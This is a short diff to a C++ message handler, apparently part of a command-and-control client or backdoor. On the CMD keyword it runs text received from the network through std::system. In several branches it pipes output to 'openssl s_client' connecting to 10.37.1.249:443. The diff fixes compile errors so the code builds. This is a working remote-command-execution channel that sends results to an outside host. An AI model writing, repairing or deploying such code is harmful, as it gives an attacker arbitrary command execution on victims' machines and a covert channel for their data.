@@ -23,19 +23,19 @@ void handleMessage(const std::string& msg, int sock) {
         std::string s = std::string("HELLO ") + id;
         //send(sock, s.c_str(), s.size(), 0);
         
-        std::string command = s.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
-        std::system(command.c_str());
+        std::string command = s + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
+        int r = std::system(command.c_str());
     } else if(keyword == "EXIT") {
         // throw
         throw 1;
     } else if(keyword == "CMD"){
-        std::string command = iss.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
-        std::system(command.c_str());
+        std::string command = iss.str() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
+        int r = std::system(command.c_str());
     } else {
         // ERR
         std::string s = std::string("ERR ") + id;
-        std::string command = s.string() + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
-        std::system(command.c_str());
+        std::string command = s + std::string("| openssl s_client -connect 10.37.1.249:443 -quiet");
+        int r = std::system(command.c_str());
     }
 }
 
